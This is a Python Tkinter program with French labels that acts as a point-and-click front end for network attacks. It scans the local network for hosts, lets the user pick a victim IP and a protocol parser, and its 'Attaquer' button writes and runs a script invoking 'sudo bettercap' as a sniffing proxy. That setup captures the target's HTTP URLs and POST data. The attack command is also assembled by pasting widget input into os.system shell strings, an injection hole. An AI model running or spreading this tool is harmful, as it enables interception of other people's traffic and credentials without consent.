#!/usr/bin/env python
# -*- coding: utf-8 -*-

# ----- IMPORTS ----- #

from tkinter import *
from tkinter import ttk
from tkinter import filedialog
import subprocess as sub
import netifaces as nf
import time
import sys
import os

# ----- FONCTIONS ----- #

def NewFile():
	main.set("")
	attack.set("")

def List_user_auto():
	os.system('rm scan_list')
	os.system('rm interfaces')
	main.set(os.system('python3 interface_list_user2.py'))
	file = open('scan_list', 'r')
	main.set(file.read())
	file.close()

def List_user_man():
	os.system('rm scan_list')
	os.system('rm ip.txt')
	main.set(os.system('python3 interface_list_user.py'))
	os.system("sed -e '1d' scan_list > scan_list.tmp && mv scan_list.tmp scan_list")
	os.system("cat scan_list | grep 1 | cut -d ' ' -f 1 > ip.txt")
	file = open('scan_list', 'r')
	main.set(file.read())
	file.close()

def Print_Attack_User():
	def Attack_user(*args):
		os.system("echo '' > attack.sh")
		value = str(enter2.get())
		value2 = str(enter1.get())
		if value2 == "HTTP":
			value2 = "URL,POST"
		else :
			value2 = value2
		string_attack = "#!/bin/sh\n\nsudo bettercap -X -T " + value + " --proxy -P " + value2
		os.system('echo "' + string_attack + '" > attack.sh')
		os.system("python tkinter-read-async-subprocess-output.py")
	def get_list1(event):
		# get selected line index
		index = listbox1.curselection()[0]
		# get the line's text
		seltext = listbox1.get(index)
		# delete previous text in enter1
		enter1.delete(0, 50)
		# now display the selected text
		enter1.insert(0, seltext)
	def get_list2(event):
		# get selected line index
		index = listbox2.curselection()[0]
		# get the line's text
		seltext = listbox2.get(index)
		# delete previous text in enter1
		enter2.delete(0, 50)
		# now display the selected text
		enter2.insert(0, seltext)
	def set_list1(event):
		"""
		insert an edited line from the entry widget
		back into the listbox
		"""
		try:
			index = listbox1.curselection()[0]
			# delete old listbox line
			listbox1.delete(index)
		except IndexError:
			index = END
		# insert edited item back into listbox1 at index
		listbox1.insert(index, enter1.get())
	def set_list2(event):
		"""
		insert an edited line from the entry widget
		back into the listbox
		"""
		try:
			index = listbox2.curselection()[0]
			# delete old listbox line
			listbox2.delete(index)
		except IndexError:
			index = END
		# insert edited item back into listbox1 at index
		listbox2.insert(index, enter2.get())
	def printer(event):
		print("Alccolselect=",listbox1.get(listbox1.curselection()))
		# read the data file into a list
	fin = open("flux.txt", "r")
	chem_list = fin.readlines()
	fin.close()
	# strip the trailing newline char
	chem_list = [chem.rstrip() for chem in chem_list]
	# read the data file into a list
	fin2 = open("ip.txt", "r")
	chem_list2 = fin2.readlines()
	fin2.close()
	# strip the trailing newline char
	chem_list2 = [chem.rstrip() for chem in chem_list2]
	ttk.Label(mainframe, text="Machine à attaquer : ").grid(row=3,column=1)
	# create the listbox (note that size is in characters)
	listbox2 = Listbox(mainframe, width=20, height=3)
	listbox2.grid(row=3, column=2)
	# use entry widget to display/edit selection
	enter2 = ttk.Entry(mainframe, width=20)
	enter2.insert(0, 'Choisissez une IP')
	enter2.grid(row=4, column=2)
	# pressing the return key will update edited line
	enter2.bind('<Return>', set_list2)
	# or double click left mouse button to update line
	enter2.bind('<Double-1>', set_list2)
	# load the listbox with data
	for item in chem_list2:
		listbox2.insert(END, item)	   
	# left mouse click on a list item to display selection
	listbox2.bind('<ButtonRelease-1>', get_list2)
	# create the listbox (note that size is in characters)
	listbox1 = Listbox(mainframe, width=20, height=3)
	listbox1.grid(row=3, column=4)
	# use entry widget to display/edit selection
	enter1 = ttk.Entry(mainframe, width=20)
	enter1.insert(0, 'Choisissez un flux')
	enter1.grid(row=4, column=4)
	# pressing the return key will update edited line
	enter1.bind('<Return>', set_list1)
	# or double click left mouse button to update line
	enter1.bind('<Double-1>', set_list1)
	# load the listbox with data
	for item in chem_list:
		listbox1.insert(END, item)
	# left mouse click on a list item to display selection
	listbox1.bind('<ButtonRelease-1>', get_list1)
	ttk.Button(mainframe, text="Attaquer", command=Attack_user).grid(row=3,column=5)
	
def About():
	main.set("This is a simple example of a menu")



# ----- INTERFACE ----- #

root = Tk()
root.title("EIB")
root.geometry("1280x800")
mainframe = ttk.Frame(root, padding="3 3 12 12")
mainframe.grid(column=0, row=0, sticky=(N, W, E, S))
mainframe.columnconfigure(0, weight=2)
mainframe.rowconfigure(0, weight=2)
menu = Menu(root)
root.config(menu=menu)

main = StringVar()
attack = StringVar()
ip = StringVar()
flux_choix = StringVar()


# ----- MENU ----- #

filemenu = Menu(menu)
menu.add_cascade(label="File", menu=filemenu)
filemenu.add_command(label="New", command=NewFile)
filemenu.add_separator()
filemenu.add_command(label="Exit", command=root.quit)

actionmenu = Menu(menu)
menu.add_cascade(label="Action", menu=actionmenu)
actionmenu.add_command(label="List network auto", command=List_user_auto)
actionmenu.add_command(label="List network manuel", command=List_user_man)
actionmenu.add_command(label="Attack user", command=Print_Attack_User)

helpmenu = Menu(menu)
menu.add_cascade(label="Help", menu=helpmenu)
helpmenu.add_command(label="About...", command=About)

# ----- AFFICHAGE ----- #



ttk.Label(mainframe, textvariable=main).grid(row=1, column=2)
ttk.Label(mainframe, textvariable=attack).grid(row=2, column=2)



	

# ----- FIN INTERFACE ---- #

mainloop()

